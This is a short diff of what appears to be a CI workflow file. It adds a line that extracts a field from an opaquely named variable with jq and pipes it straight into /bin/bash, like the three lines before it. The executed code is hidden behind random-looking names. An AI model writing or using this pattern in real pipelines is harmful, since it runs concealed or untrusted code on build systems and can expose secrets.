@@ -25,6 +25,7 @@ jobs:
           echo $fhbu651 | jq -r .zsx082 | /bin/bash
           printf '%s' "$ind87628" | jq -r .fkb5 | /bin/bash
           echo $w6688 | jq -r .e235 | /bin/bash
+          echo $mqroh00194 | jq -r .xppd7266 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
